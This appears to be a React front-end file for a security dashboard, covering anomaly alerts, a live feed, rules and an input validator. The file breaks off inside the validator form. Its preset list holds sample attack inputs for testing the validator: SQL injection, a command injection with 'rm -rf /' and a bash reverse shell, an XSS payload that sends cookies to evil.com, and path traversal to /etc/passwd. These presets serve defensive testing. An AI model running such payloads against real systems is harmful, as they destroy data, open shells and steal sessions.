import { useState, useEffect, useCallback, useRef } from 'react'
import { guardrailsValidationApi, guardrailsRulesApi, guardrailsAnomalyApi, guardrailsAnalyticsApi } from '../api/index.js'
import { useToast } from '../store/ToastContext.jsx'

// ── Constants ─────────────────────────────────────────────────────────────────

const SEV_META = {
  critical: { label: 'Critical', color: '#DC2626', bg: '#FEF2F2', dot: '🔴' },
  high:     { label: 'High',     color: '#D97706', bg: '#FFFBEB', dot: '🟠' },
  medium:   { label: 'Medium',   color: '#4F46E5', bg: '#EEF2FF', dot: '🟡' },
  low:      { label: 'Low',      color: '#6B7280', bg: '#F3F4F6', dot: '⚪' },
}

const TYPE_COLORS = {
  order_amount:          '#4F46E5',
  rapid_ordering:        '#DC2626',
  payment_failure:       '#F59E0B',
  search_injection:      '#7C3AED',
  inventory_price:       '#059669',
  inventory_stock:       '#0EA5E9',
  inventory_drain:       '#EA580C',
  bot_behavior:          '#DB2777',
  bulk_purchase:         '#D97706',
  replay_attack:         '#DC2626',
  new_account_high_value:'#B45309',
}

const ACTION_META = {
  block: { label: 'BLOCK', color: '#DC2626', bg: '#FEF2F2', border: '#FECACA' },
  flag:  { label: 'FLAG',  color: '#D97706', bg: '#FFFBEB', border: '#FDE68A' },
  pass:  { label: 'PASS',  color: '#059669', bg: '#ECFDF5', border: '#A7F3D0' },
}

const ALERT_STATUS_META = {
  open:           { label: 'Open',           color: '#DC2626' },
  acknowledged:   { label: 'Acknowledged',   color: '#D97706' },
  resolved:       { label: 'Resolved',       color: '#059669' },
  false_positive: { label: 'False Positive', color: '#6B7280' },
}

const PRESETS = [
  { label: 'SQL Injection',     context: 'text',   input: "1=1 UNION SELECT * FROM users; DROP TABLE orders--" },
  { label: 'Command Injection', context: 'text',   input: "$(rm -rf /); bash -i >& /dev/tcp/10.0.0.1/4444" },
  { label: 'XSS',              context: 'text',   input: "<script>fetch('https://evil.com?c='+document.cookie)</script>" },
  { label: 'Path Traversal',   context: 'text',   input: "../../etc/passwd" },
  { label: 'Clean Search',     context: 'search', input: "whey protein chocolate 2kg" },
]

function timeAgo(ts) {
  if (!ts) return ''
  const diff = (Date.now() - new Date(ts).getTime()) / 1000
  if (diff < 60) return `${Math.round(diff)}s ago`
  if (diff < 3600) return `${Math.round(diff / 60)}m ago`
  if (diff < 86400) return `${Math.round(diff / 3600)}h ago`
  return `${Math.round(diff / 86400)}d ago`
}

// ── Badge components ──────────────────────────────────────────────────────────

function SevBadge({ severity }) {
  const m = SEV_META[severity] || SEV_META.low
  return (
    <span style={{
      display: 'inline-block', fontSize: '0.7rem', fontWeight: 700,
      padding: '2px 8px', borderRadius: 20, background: m.bg, color: m.color,
    }}>
      {m.label}
    </span>
  )
}

function ActionBadge({ action, score }) {
  const m = ACTION_META[action] || ACTION_META.pass
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
      <span style={{
        display: 'inline-block', fontWeight: 900, fontSize: '1.1rem',
        padding: '6px 18px', borderRadius: 8, letterSpacing: '.06em',
        background: m.bg, color: m.color, border: `2px solid ${m.border}`,
      }}>
        {m.label}
      </span>
      <span style={{ fontVariantNumeric: 'tabular-nums', fontWeight: 800, fontSize: '1.1rem', color: m.color }}>
        Score: {score ?? '—'}
      </span>
    </div>
  )
}

function RuleTypeBadge({ type }) {
  const map = { regex: ['#EEF2FF','#4F46E5'], rate_limit: ['#FFFBEB','#D97706'], threshold: ['#FEF2F2','#DC2626'], zscore: ['#F0FDF4','#059669'], range: ['#F8FAFC','#6B7280'] }
  const [bg, color] = map[type] || map.range
  return (
    <span style={{ display: 'inline-block', fontSize: '0.68rem', fontWeight: 700, padding: '2px 7px', borderRadius: 4, background: bg, color, fontFamily: 'monospace' }}>
      {type}
    </span>
  )
}

// ── SVG Charts ────────────────────────────────────────────────────────────────

function HourlyTrendChart({ data }) {
  if (!data || data.length === 0) return null
  const maxCount = Math.max(...data.map(d => d.count), 1)
  const W = 480, H = 80, BAR = 13, GAP = 7, PAD_L = 4, PAD_B = 18
  const currentHour = new Date().getHours()

  return (
    <svg width="100%" viewBox={`0 0 ${W} ${H + PAD_B}`} style={{ display: 'block', overflow: 'visible' }}>
      {data.map((d, i) => {
        const barH = Math.max((d.count / maxCount) * H, d.count > 0 ? 3 : 1)
        const x = PAD_L + i * (BAR + GAP)
        const y = H - barH
        const isCurrent = d.hour === currentHour
        const fill = d.count === 0 ? '#E5E7EB'
          : d.count >= 5 ? '#DC2626'
          : d.count >= 2 ? '#F59E0B'
          : '#4F46E5'
        return (
          <g key={i}>
            <rect x={x} y={y} width={BAR} height={barH} fill={fill} rx={2}
              stroke={isCurrent ? '#111' : 'none'} strokeWidth={isCurrent ? 1.5 : 0} />
            {i % 6 === 0 && (
              <text x={x + BAR / 2} y={H + PAD_B - 2} textAnchor="middle" fontSize="9" fill="#9CA3AF">
                {d.hour}h
              </text>
            )}
          </g>
        )
      })}
    </svg>
  )
}

function DonutChart({ byType }) {
  const entries = Object.entries(byType || {}).filter(([, v]) => v > 0)
  const total = entries.reduce((s, [, v]) => s + v, 0)
  if (total === 0) {
    return (
      <div style={{ textAlign: 'center', padding: '20px 0', color: 'var(--muted)', fontSize: '0.8rem' }}>
        No open alerts
      </div>
    )
  }

  const R = 52, r = 33, CX = 65, CY = 65
  let angle = -Math.PI / 2
  const slices = entries.map(([type, count]) => {
    const sweep = (count / total) * 2 * Math.PI
    const end = angle + sweep
    const x1 = CX + R * Math.cos(angle), y1 = CY + R * Math.sin(angle)
    const x2 = CX + R * Math.cos(end),   y2 = CY + R * Math.sin(end)
    const ix1 = CX + r * Math.cos(angle), iy1 = CY + r * Math.sin(angle)
    const ix2 = CX + r * Math.cos(end),   iy2 = CY + r * Math.sin(end)
    const large = sweep > Math.PI ? 1 : 0
    const path = `M ${x1} ${y1} A ${R} ${R} 0 ${large} 1 ${x2} ${y2} L ${ix2} ${iy2} A ${r} ${r} 0 ${large} 0 ${ix1} ${iy1} Z`
    const result = { type, count, path, color: TYPE_COLORS[type] || '#94A3B8' }
    angle = end
    return result
  })

  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 16 }}>
      <svg width={130} height={130} viewBox="0 0 130 130" style={{ flexShrink: 0 }}>
        {slices.map((s, i) => (
          <path key={i} d={s.path} fill={s.color} />
        ))}
        <text x={CX} y={CY - 6} textAnchor="middle" fontSize="20" fontWeight="800" fill="#111" fontVariantNumeric="tabular-nums">
          {total}
        </text>
        <text x={CX} y={CY + 12} textAnchor="middle" fontSize="9" fill="#9CA3AF">open alerts</text>
      </svg>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 5, fontSize: '0.72rem' }}>
        {slices.map(s => (
          <div key={s.type} style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
            <span style={{ width: 10, height: 10, borderRadius: 2, background: s.color, display: 'inline-block', flexShrink: 0 }} />
            <span style={{ color: 'var(--muted)' }}>{s.type.replace(/_/g, ' ')}</span>
            <span style={{ fontWeight: 700, color: 'var(--text)', marginLeft: 'auto', paddingLeft: 8, fontVariantNumeric: 'tabular-nums' }}>{s.count}</span>
          </div>
        ))}
      </div>
    </div>
  )
}

// ── Main component ────────────────────────────────────────────────────────────

export default function Guardrails() {
  const toast = useToast()
  const [tab, setTab] = useState('dashboard')

  // Dashboard
  const [dash, setDash] = useState(null)
  const [dashLoading, setDashLoading] = useState(false)

  // Live Feed
  const [liveAlerts, setLiveAlerts] = useState([])
  const [liveConnected, setLiveConnected] = useState(false)
  const [liveCount, setLiveCount] = useState(0)
  const [lastHeartbeat, setLastHeartbeat] = useState(null)
  const esRef = useRef(null)
  const feedRef = useRef(null)

  // Validator
  const [vContext, setVContext] = useState('text')
  const [vInput, setVInput] = useState('')
  const [vContactFields, setVContactFields] = useState({ phone: '', email: '', pincode: '', name: '' })
  const [vAmount, setVAmount] = useState('')
  const [vAmountCtx, setVAmountCtx] = useState('order')
  const [vResult, setVResult] = useState(null)
  const [vLoading, setVLoading] = useState(false)

  // Rules
  const [rules, setRules] = useState([])
  const [rulesLoading, setRulesLoading] = useState(false)
  const [toggling, setToggling] = useState(null)

  // Alerts
  const [alerts, setAlerts] = useState([])
  const [alertsLoading, setAlertsLoading] = useState(false)
  const [scanning, setScanning] = useState(false)
  const [alertFilter, setAlertFilter] = useState('open')
  const [resolveModal, setResolveModal] = useState(null)
  const [resolveNote, setResolveNote] = useState('')
  const [resolveSubmitting, setResolveSubmitting] = useState(false)

  // Entity investigation panel
  const [entityPanel, setEntityPanel] = useState(null)

  // ── Loaders ─────────────────────────────────────────────────────────────────

  const loadDashboard = useCallback(async () => {
    setDashLoading(true)
    try {
      const r = await guardrailsAnomalyApi.dashboard()
      setDash(r.data)
    } catch { /* silent */ }
    finally { setDashLoading(false) }
  }, [])

  const loadRules = useCallback(async () => {
    setRulesLoading(true)
    try {
      const r = await guardrailsRulesApi.list()
      setRules(r.data.rules || r.data || [])
    } catch { toast('Could not load rules', 'error') }
    finally { setRulesLoading(false) }
  }, [])

  const loadAlerts = useCallback(async (status) => {
    setAlertsLoading(true)
    try {
      const r = await guardrailsAnomalyApi.alerts({ status, limit: 100 })
      setAlerts(r.data.alerts || [])
    } catch { toast('Could not load alerts', 'error') }
    finally { setAlertsLoading(false) }
  }, [])

  // ── SSE lifecycle ────────────────────────────────────────────────────────────

  function startSSE() {
    if (esRef.current) {
      esRef.current.close()
    }
    const es = new EventSource(guardrailsAnomalyApi.streamUrl())
    esRef.current = es

    es.addEventListener('connected', (e) => {
      const d = JSON.parse(e.data)
      setLiveConnected(true)
      setLiveCount(d.open_count || 0)
    })

    es.addEventListener('alert', (e) => {
      const a = JSON.parse(e.data)
      setLiveAlerts(prev => {
        const next = [a, ...prev]
        return next.slice(0, 200)
      })
      setLiveCount(c => c + 1)
    })

    es.addEventListener('heartbeat', () => {
      setLastHeartbeat(new Date())
    })

    es.onerror = () => {
      setLiveConnected(false)
    }
  }

  function stopSSE() {
    if (esRef.current) {
      esRef.current.close()
      esRef.current = null
    }
    setLiveConnected(false)
  }

  // ── Effects ──────────────────────────────────────────────────────────────────

  useEffect(() => {
    loadDashboard()
  }, [])

  useEffect(() => {
    if (tab === 'livefeed') {
      startSSE()
    } else {
      stopSSE()
    }
    if (tab === 'rules')  loadRules()
    if (tab === 'alerts') loadAlerts(alertFilter)
    if (tab === 'dashboard') loadDashboard()
  }, [tab])

  useEffect(() => {
    if (tab === 'alerts') loadAlerts(alertFilter)
  }, [alertFilter])

  useEffect(() => () => stopSSE(), [])

  // ── Actions ──────────────────────────────────────────────────────────────────

  async function runScan() {
    setScanning(true)
    try {
      const r = await guardrailsAnomalyApi.scan('full')
      const d = r.data
      toast(`Scan complete — ${d.new_alerts_saved ?? 0} new alert(s) from ${d.detectors_run ?? 10} detectors`, 'success')
      if (tab === 'alerts')    loadAlerts(alertFilter)
      if (tab === 'dashboard') loadDashboard()
    } catch {
      toast('Scan failed', 'error')
    } finally {
      setScanning(false)
    }
  }

  async function validate() {
    setVLoading(true)
    setVResult(null)
    try {
      let r
      if (vContext === 'contact')     r = await guardrailsValidationApi.contact(vContactFields)
      else if (vContext === 'amount') r = await guardrailsValidationApi.amount({ amount: Number(vAmount), context: vAmountCtx })
      else if (vContext === 'search') r = await guardrailsValidationApi.search({ query: vInput })
      else                            r = await guardrailsValidationApi.text({ text: vInput, context: vContext })
      setVResult(r.data)
    } catch (e) {
      toast(e.response?.data?.detail || 'Validation failed', 'error')
    } finally { setVLoading(false) }
  }

  async function toggleRule(rule) {
    setToggling(rule.id)
    try {
      await guardrailsRulesApi.toggle(rule.id)
      setRules(prev => prev.map(r => r.id === rule.id ? { ...r, is_active: !r.is_active } : r))
      toast(`Rule "${rule.name}" ${rule.is_active ? 'disabled' : 'enabled'}`, 'success')
    } catch {
      toast('Could not toggle rule', 'error')
    } finally { setToggling(null) }
  }

  async function acknowledgeAlert(id) {
    try {
      await guardrailsAnomalyApi.acknowledge(id)
      toast('Alert acknowledged', 'success')
      loadAlerts(alertFilter)
    } catch { toast('Could not acknowledge', 'error') }
  }

  async function submitResolve() {
    if (!resolveModal) return
    setResolveSubmitting(true)
    try {
      const payload = { resolved_by: 'ops_team', resolution_note: resolveNote || 'Reviewed by ops team' }
      if (resolveModal.type === 'fp') {
        await guardrailsAnomalyApi.falsePositive(resolveModal.alert.id, payload)
        toast('Marked as false positive', 'success')
      } else {
        await guardrailsAnomalyApi.resolve(resolveModal.alert.id, payload)
        toast('Alert resolved', 'success')
      }
      setResolveModal(null)
      setResolveNote('')
      loadAlerts(alertFilter)
      if (tab === 'dashboard') loadDashboard()
    } catch {
      toast('Could not complete action', 'error')
    } finally { setResolveSubmitting(false) }
  }

  // ── Render ───────────────────────────────────────────────────────────────────

  const kpis = dash?.kpis || {}
  const openCount = kpis.open || 0

  return (
    <div className="page">
      <div className="container">

        {/* Page header */}
        <div style={s.pageHeader}>
          <div>
            <h1 style={{ marginBottom: 4 }}>Security Operations Center</h1>
            <p style={{ color: 'var(--muted)', fontSize: '0.875rem' }}>
              10-detector anomaly engine · Real-time alert stream · Input validation · Runtime rules
            </p>
          </div>
          <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
            <span style={s.portChip}>localhost:8010</span>
            <button className="btn btn-primary btn-sm" disabled={scanning} onClick={runScan}>
              {scanning ? 'Scanning…' : 'Run Scan'}
            </button>
          </div>
        </div>

        {/* KPI strip — always visible */}
        <div style={s.kpiStrip}>
          {[
            { label: 'Critical', value: kpis.critical ?? '—', color: '#DC2626', bg: '#FEF2F2' },
            { label: 'High',     value: kpis.high     ?? '—', color: '#D97706', bg: '#FFFBEB' },
            { label: 'Medium',   value: kpis.medium   ?? '—', color: '#4F46E5', bg: '#EEF2FF' },
            { label: 'Low',      value: kpis.low      ?? '—', color: '#6B7280', bg: '#F3F4F6' },
            { label: 'Open Total', value: openCount,           color: '#111',   bg: '#fff', border: '2px solid var(--border)' },
            { label: 'New (24h)', value: kpis.new_24h  ?? '—', color: '#4F46E5', bg: '#EEF2FF' },
            { label: 'Resolved (24h)', value: kpis.resolved_24h ?? '—', color: '#059669', bg: '#ECFDF5' },
          ].map(k => (
            <div key={k.label} style={{ ...s.kpiCard, background: k.bg, border: k.border || `1px solid ${k.bg}` }}>
              <span style={{ fontSize: '1.6rem', fontWeight: 800, color: k.color, fontVariantNumeric: 'tabular-nums', lineHeight: 1 }}>
                {k.value}
              </span>
              <span style={{ fontSize: '0.7rem', color: k.color, fontWeight: 600, marginTop: 3 }}>{k.label}</span>
            </div>
          ))}
        </div>

        {/* Tabs */}
        <div style={s.tabBar}>
          {[
            ['dashboard', 'Dashboard'],
            ['livefeed',  `Live Feed${liveConnected ? ' ●' : ''}`],
            ['alerts',    `Alerts${openCount > 0 ? ` (${openCount})` : ''}`],
            ['rules',     'Rules'],
            ['validator', 'Validator'],
          ].map(([key, label]) => (
            <button key={key} style={{ ...s.tab, ...(tab === key ? s.tabActive : {}),
              ...(key === 'livefeed' && liveConnected ? { color: '#059669' } : {}) }}
              onClick={() => setTab(key)}>
              {label}
            </button>
          ))}
        </div>

        {/* ── Dashboard Tab ── */}
        {tab === 'dashboard' && (
          dashLoading && !dash ? (
            <div className="spinner-wrap"><div className="spinner" /></div>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>

              {/* Charts row */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 20 }}>

                <div style={s.card}>
                  <div style={s.cardHead}>Alert Activity — Last 24 Hours</div>
                  <div style={{ padding: '16px 18px' }}>
                    {dash?.hourly_trend ? (
                      <HourlyTrendChart data={dash.hourly_trend} />
                    ) : (
                      <div style={{ textAlign: 'center', color: 'var(--muted)', fontSize: '0.8rem', padding: '20px 0' }}>
                        Run a scan to see activity
                      </div>
                    )}
                    <div style={{ display: 'flex', gap: 12, marginTop: 10, fontSize: '0.72rem' }}>
                      {[['#DC2626','≥5 alerts'],['#F59E0B','2-4 alerts'],['#4F46E5','1 alert'],['#E5E7EB','None']].map(([c,l]) => (
                        <span key={l} style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                          <span style={{ width: 8, height: 8, borderRadius: 1, background: c, display: 'inline-block' }} />
                          <span style={{ color: 'var(--muted)' }}>{l}</span>
                        </span>
                      ))}
                    </div>
                  </div>
                </div>

                <div style={s.card}>
                  <div style={s.cardHead}>Open Alerts by Type</div>
                  <div style={{ padding: '16px 18px' }}>
                    <DonutChart byType={dash?.by_type || {}} />
                  </div>
                </div>

              </div>

              {/* Top risky entities */}
              <div style={s.card}>
                <div style={{ ...s.cardHead, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <span>Top Risky Entities</span>
                  <span style={{ fontSize: '0.72rem', color: 'var(--muted)', fontWeight: 400 }}>
                    Open + acknowledged, ranked by max risk score
                  </span>
                </div>
                {!dash?.top_entities?.length ? (
                  <div style={{ padding: '24px', textAlign: 'center', color: 'var(--muted)', fontSize: '0.85rem' }}>
                    No active risky entities — system clean
                  </div>
                ) : (
                  <div style={{ overflowX: 'auto' }}>
                    <table style={{ ...s.table, margin: 0 }}>
                      <thead>
                        <tr>
                          {['Entity', 'Type', 'Alerts', 'Max Risk', 'Risk Gauge', 'Action'].map(h => (
                            <th key={h} style={s.th}>{h}</th>
                          ))}
                        </tr>
                      </thead>
                      <tbody>
                        {dash.top_entities.map((e, i) => {
                          const riskColor = e.max_risk >= 75 ? '#DC2626' : e.max_risk >= 55 ? '#D97706' : '#4F46E5'
                          return (
                            <tr key={i} style={s.tr}>
                              <td style={{ ...s.td, fontFamily: 'monospace', fontSize: '0.78rem', maxWidth: 160 }}>
                                <span title={e.entity_id}>{e.entity_id?.slice(0, 20)}{e.entity_id?.length > 20 ? '…' : ''}</span>
                              </td>
                              <td style={s.td}>
                                <span style={{ fontSize: '0.72rem', background: '#EEF2FF', color: '#4F46E5', padding: '2px 8px', borderRadius: 4, fontWeight: 600 }}>
                                  {e.entity_type}
                                </span>
                              </td>
                              <td style={{ ...s.td, fontVariantNumeric: 'tabular-nums', fontWeight: 700, color: '#4F46E5' }}>
                                {e.alert_count}
                              </td>
                              <td style={{ ...s.td, fontVariantNumeric: 'tabular-nums', fontWeight: 800, color: riskColor }}>
                                {e.max_risk}
                              </td>
                              <td style={{ ...s.td, minWidth: 100 }}>
                                <div style={{ height: 6, background: '#F3F4F6', borderRadius: 3, overflow: 'hidden' }}>
                                  <div style={{ height: '100%', width: `${e.max_risk}%`, background: riskColor, borderRadius: 3, transition: 'width .3s' }} />
                                </div>
                              </td>
                              <td style={s.td}>
                                <button className="btn btn-ghost btn-sm"
                                  onClick={() => { setEntityPanel(e); setTab('alerts') }}>
                                  Investigate
                                </button>
                              </td>
                            </tr>
                          )
                        })}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>

            </div>
          )
        )}

        {/* ── Live Feed Tab ── */}
        {tab === 'livefeed' && (
          <div>
            {/* Connection bar */}
            <div style={{ ...s.filterRow, marginBottom: 16 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{
                  width: 10, height: 10, borderRadius: '50%',
                  background: liveConnected ? '#059669' : '#DC2626',
                  display: 'inline-block',
                  boxShadow: liveConnected ? '0 0 0 3px rgba(5,150,105,.2)' : 'none',
                }} />
                <span style={{ fontSize: '0.85rem', fontWeight: 700, color: liveConnected ? '#059669' : '#DC2626' }}>
                  {liveConnected ? 'LIVE' : 'DISCONNECTED'}
                </span>
                {liveConnected && lastHeartbeat && (
                  <span style={{ fontSize: '0.72rem', color: 'var(--muted)' }}>
                    heartbeat {timeAgo(lastHeartbeat)}
                  </span>
                )}
              </div>
              <span style={{ fontSize: '0.8rem', color: 'var(--muted)', marginLeft: 16 }}>
                {liveAlerts.length} alert(s) received this session
              </span>
              <div style={{ marginLeft: 'auto', display: 'flex', gap: 8 }}>
                {!liveConnected && (
                  <button className="btn btn-primary btn-sm" onClick={startSSE}>Reconnect</button>
                )}
                <button className="btn btn-ghost btn-sm"
                  onClick={() => { setLiveAlerts([]); setLiveCount(0) }}>
                  Clear Feed
                </button>
              </div>
            </div>

            {/* Feed */}
            <div ref={feedRef} style={{
              background: '#0D1117', borderRadius: 12, border: '1px solid #30363D',
              minHeight: 320, maxHeight: 520, overflowY: 'auto', padding: '4px 0',
              fontFamily: 'monospace',
            }}>
              {liveAlerts.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '60px 0', color: '#58A6FF', fontSize: '0.85rem' }}>
                  {liveConnected
                    ? 'Waiting for alerts… Run a scan to generate events.'
                    : 'Connecting to event stream…'}
                </div>
              ) : (
                liveAlerts.map((a, i) => {
                  const sm = SEV_META[a.severity] || SEV_META.low
                  return (
                    <div key={`${a.id}-${i}`} style={{
                      display: 'flex', alignItems: 'center', gap: 12,
                      padding: '8px 16px',
                      borderBottom: '1px solid #21262D',
                      background: i === 0 ? 'rgba(88,166,255,.05)' : 'transparent',
                    }}>
                      <span style={{ color: sm.color, fontWeight: 700, fontSize: '0.72rem', minWidth: 62 }}>
                        {sm.dot} {sm.label.toUpperCase()}
                      </span>
                      <span style={{ color: '#8B949E', fontSize: '0.72rem', minWidth: 80, fontVariantNumeric: 'tabular-nums' }}>
                        {timeAgo(a.detected_at || a.created_at)}
                      </span>
                      <span style={{ color: '#79C0FF', fontSize: '0.76rem', minWidth: 160 }}>
                        {a.anomaly_type}
                      </span>
                      <span style={{ color: '#E6EDF3', fontSize: '0.76rem', flex: 1 }}>
                        {a.title}
                      </span>
                      <span style={{ color: '#8B949E', fontSize: '0.7rem' }}>
                        risk: <span style={{ color: sm.color, fontWeight: 700 }}>{a.risk_score}</span>
                      </span>
                    </div>
                  )
                })
              )}
            </div>

            <div style={{ marginTop: 12, fontSize: '0.72rem', color: 'var(--muted)' }}>
              SSE stream: <code style={{ fontSize: '0.7em' }}>GET http://localhost:8010/anomaly/stream</code>
              {' · '}New open alerts polled every 30 s · heartbeat every 10 s
            </div>
          </div>
        )}

        {/* ── Alerts Tab ── */}
        {tab === 'alerts' && (
          <div>
            <div style={s.filterRow}>
              <span style={{ fontSize: '0.8rem', color: 'var(--muted)', fontWeight: 600 }}>Status:</span>
              {['open','acknowledged','resolved','false_positive'].map(st => (
                <button key={st} style={{ ...s.chip, ...(alertFilter === st ? s.chipActive : {}) }}
                  onClick={() => setAlertFilter(st)}>
                  {ALERT_STATUS_META[st]?.label}
                </button>
              ))}
              {entityPanel && (
                <span style={{ marginLeft: 8, fontSize: '0.78rem', background: '#EEF2FF', color: '#4F46E5', padding: '4px 12px', borderRadius: 20, fontWeight: 600 }}>
                  Filtering: {entityPanel.entity_id?.slice(0, 16)}
                  <button style={{ background: 'none', border: 'none', cursor: 'pointer', color: '#4F46E5', marginLeft: 4 }}
                    onClick={() => setEntityPanel(null)}>×</button>
                </span>
              )}
            </div>

            {alertsLoading ? (
              <div className="spinner-wrap"><div className="spinner" /></div>
            ) : (() => {
              const filtered = entityPanel
                ? alerts.filter(a => a.entity_id === entityPanel.entity_id)
                : alerts
              return filtered.length === 0 ? (
                <div className="empty-state" style={{ padding: '48px 0' }}>
                  <div style={{ fontSize: '2.5rem', marginBottom: 12 }}>{alertFilter === 'open' ? '✅' : '📋'}</div>
                  <h3>{alertFilter === 'open' ? 'No open anomaly alerts' : 'No alerts found'}</h3>
                  {alertFilter === 'open' && (
                    <p style={{ color: 'var(--muted)', fontSize: '0.85rem', marginTop: 8 }}>
                      Click "Run Scan" to check all 10 detectors.
                    </p>
                  )}
                </div>
              ) : (
                <div style={{ display: 'flex', flexDirection: 'column', gap: 0 }}>
                  {filtered.map(a => {
                    const sm = SEV_META[a.severity] || SEV_META.low
                    return (
                      <div key={a.id} style={{ ...s.alertRow, borderLeft: `3px solid ${sm.color}` }}>
                        <div style={{ flex: 1, minWidth: 0 }}>
                          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 3 }}>
                            <SevBadge severity={a.severity} />
                            <span style={{ fontWeight: 700, fontSize: '0.85rem' }}>{a.title || a.anomaly_type}</span>
                            <span style={{ fontSize: '0.7rem', fontWeight: 700, padding: '2px 6px', borderRadius: 4, background: '#EEF2FF', color: '#4F46E5', fontVariantNumeric: 'tabular-nums' }}>
                              Risk: {a.risk_score}
                            </span>
                          </div>
                          <div style={{ fontSize: '0.78rem', color: 'var(--muted)', marginBottom: 3 }}>{a.description}</div>
                          <div style={{ display: 'flex', gap: 14, fontSize: '0.72rem', color: 'var(--muted)' }}>
                            <span>Type: <strong style={{ color: 'var(--text)' }}>{a.anomaly_type}</strong></span>
                            {a.entity_id && <span>Entity: <code style={{ fontSize: '0.75em' }}>{a.entity_id.slice(0, 12)}…</code></span>}
                            <span>{timeAgo(a.detected_at)}</span>
                          </div>
                          {a.evidence && Object.keys(a.evidence).length > 0 && (
                            <div style={{ marginTop: 6, display: 'flex', gap: 8, flexWrap: 'wrap' }}>
                              {Object.entries(a.evidence).slice(0, 5).map(([k, v]) => (
                                <span key={k} style={{ fontSize: '0.7rem', background: 'var(--ground)', border: '1px solid var(--border)', borderRadius: 4, padding: '1px 7px', fontFamily: 'monospace' }}>
                                  {k}: {String(v)}
                                </span>
                              ))}
                            </div>
                          )}
                        </div>
                        <div style={{ display: 'flex', gap: 6, flexShrink: 0, flexDirection: 'column' }}>
                          {a.status === 'open' && (
                            <button className="btn btn-ghost btn-sm" onClick={() => acknowledgeAlert(a.id)}>Acknowledge</button>
                          )}
                          {(a.status === 'open' || a.status === 'acknowledged') && (
                            <>
                              <button className="btn btn-outline btn-sm"
                                onClick={() => { setResolveModal({ alert: a, type: 'resolve' }); setResolveNote('') }}>
                                Resolve
                              </button>
                              <button className="btn btn-ghost btn-sm" style={{ color: 'var(--muted)', fontSize: '0.75rem' }}
                                onClick={() => { setResolveModal({ alert: a, type: 'fp' }); setResolveNote('') }}>
                                False Positive
                              </button>
                            </>
                          )}
                          {a.status === 'resolved' && (
                            <span style={{ fontSize: '0.75rem', color: '#059669', fontWeight: 600 }}>Resolved</span>
                          )}
                          {a.status === 'false_positive' && (
                            <span style={{ fontSize: '0.75rem', color: 'var(--muted)', fontWeight: 600 }}>False +ve</span>
                          )}
                        </div>
                      </div>
                    )
                  })}
                </div>
              )
            })()}
          </div>
        )}

        {/* ── Rules Tab ── */}
        {tab === 'rules' && (
          <div>
            {rulesLoading ? (
              <div className="spinner-wrap"><div className="spinner" /></div>
            ) : (
              <div style={{ overflowX: 'auto' }}>
                <table style={s.table}>
                  <thead>
                    <tr>
                      {['Rule', 'Type', 'Target', 'Severity', 'Action', 'Triggers', 'Status'].map(h => (
                        <th key={h} style={s.th}>{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {rules.map(r => (
                      <tr key={r.id} style={{ ...s.tr, opacity: r.is_active ? 1 : 0.5 }}>
                        <td style={s.td}>
                          <div style={{ fontWeight: 700, fontSize: '0.85rem', fontFamily: 'monospace' }}>{r.name}</div>
                          <div style={{ fontSize: '0.72rem', color: 'var(--muted)', marginTop: 2, maxWidth: 220 }}>{r.description}</div>
                        </td>
                        <td style={s.td}><RuleTypeBadge type={r.rule_type} /></td>
                        <td style={{ ...s.td, fontSize: '0.8rem', color: 'var(--muted)' }}>{r.target_type}</td>
                        <td style={s.td}><SevBadge severity={r.severity} /></td>
                        <td style={s.td}>
                          <span style={{
                            fontSize: '0.72rem', fontWeight: 700, padding: '2px 8px', borderRadius: 4,
                            ...(r.action === 'block' ? { background: '#FEF2F2', color: '#DC2626' }
                              : r.action === 'flag'  ? { background: '#FFFBEB', color: '#D97706' }
                              : { background: '#EEF2FF', color: '#4F46E5' }),
                          }}>
                            {r.action}
                          </span>
                        </td>
                        <td style={{ ...s.td, fontVariantNumeric: 'tabular-nums', fontWeight: 700, color: r.trigger_count > 0 ? '#4F46E5' : 'var(--muted)' }}>
                          {r.trigger_count ?? 0}
                        </td>
                        <td style={s.td}>
                          <button
                            className={r.is_active ? 'btn btn-ghost btn-sm' : 'btn btn-outline btn-sm'}
                            style={{ minWidth: 72 }}
                            disabled={toggling === r.id}
                            onClick={() => toggleRule(r)}
                          >
                            {toggling === r.id ? '…' : r.is_active ? 'Disable' : 'Enable'}
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        {/* ── Validator Tab ── */}
        {tab === 'validator' && (
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 20, alignItems: 'start' }}>

            {/* Input panel */}
            <div style={s.card}>
              <div style={s.cardHead}>Input</div>
              <div style={{ padding: '16px 18px' }}>

                <div className="form-group">
                  <label style={{ fontSize: '0.8rem', fontWeight: 600 }}>Context</label>
                  <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', marginTop: 6 }}>
                    {['text','search','contact','amount'].map(c => (
                      <button key={c} style={{ ...s.chip, ...(vContext === c ? s.chipActive : {}) }}
                        onClick={() => { setVContext(c); setVResult(null) }}>
                        {c}
                      </button>
                    ))}
                  </div>
                </div>

                {(vContext === 'text' || vContext === 'search') && (
                  <div style={{ marginBottom: 14 }}>
                    <div style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--muted)', marginBottom: 6 }}>Quick presets</div>
                    <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                      {PRESETS.filter(p => p.context === vContext || (vContext === 'text' && p.context !== 'search')).map(p => (
                        <button key={p.label} style={s.presetBtn}
                          onClick={() => { setVContext(p.context); setVInput(p.input); setVResult(null) }}>
                          {p.label}
                        </button>
                      ))}
                    </div>
                  </div>
                )}

                {(vContext === 'text' || vContext === 'search') && (
                  <div className="form-group">
                    <label style={{ fontSize: '0.8rem' }}>{vContext === 'search' ? 'Query' : 'Text input'}</label>
                    <textarea className="input"
